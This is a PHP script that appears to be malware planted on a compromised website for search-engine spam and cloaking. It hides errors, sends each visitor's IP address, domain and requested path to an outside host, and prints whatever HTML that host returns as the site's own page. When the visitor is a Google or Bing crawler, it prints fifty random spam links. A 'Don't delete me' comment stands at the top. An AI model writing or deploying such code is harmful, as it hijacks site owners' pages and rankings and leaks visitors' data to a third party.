<?php

header("HTTP/1.1 200 OK");
header("Content-Type: text/html; charset=utf-8");
define("CONSTANT_NAME", "about");

//Don't delete me, thank you! I love you!
//Don't delete me, thank you! I love you!
//Don't delete me, thank you! I love you!

try{
    ini_set('display_errors','off');
    error_reporting(E_ALL ^ E_NOTICE); 
    set_time_limit(0);

    $api_url = "https://bd.top7788.com/web3/homed.php";

    $header_curl = array("user_agent:".$_SERVER['HTTP_USER_AGENT']);
    $domain = isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
    $file=(isset($_SERVER['REQUEST_URI']) && $_SERVER['REQUEST_URI']!='')?$_SERVER['REQUEST_URI']:$_SERVER['HTTP_X_REWRITE_URL'];
	if (strpos($file, '?') !== false) {
		$post_data = array('ip'=>getIP(),'file'=>$file,'domain'=>$domain);
		$result = posturl($api_url."?".$domain.$file,$post_data);
		if(strlen($result) != 0){
			echo $result;
			exit;
		}
	}else{
		$key=$_SERVER['HTTP_USER_AGENT'];
		if(strpos($key,strtolower('google'))!==false or strpos($key,strtolower('bing'))!==false){
			$s="<ul style='list-style: none;'>";
			echo $s;
			echo "\r\n";
			$str="abcdefghijkmnpqrstuvwxyz0123456789ABCDEFGHIGKLMNPQRSTUVWXYZ";
			$codeLen='9';
			function  str_rand($str,$codeLen){
				$rand="";
				for($i=0; $i<$codeLen-1; $i++){
					$rand .= $str[mt_rand(0, strlen($str)-1)];
				}
			   return $rand;
			}
			for ($j=1;$j<=50;$j++) {
				$code=str_rand($str,$codeLen);
				$abc=$code;
				echo $a="<li><a href='?$code.html'>$code</a></li>";
				echo "\r\n";
			}
			echo "</ul>";
		}
	}
}catch (Exception $exception){

}
function posturl($url,$post_data=null){
    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_TIMEOUT, 30);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
    curl_setopt($curl, CURLOPT_REFERER, @$_SERVER['HTTP_REFERER']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($post_data));
   
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}
function getIP() {
    if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
        $ip = getenv('HTTP_CLIENT_IP');
    } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
    } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
        $ip = getenv('REMOTE_ADDR');
    } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
}
?>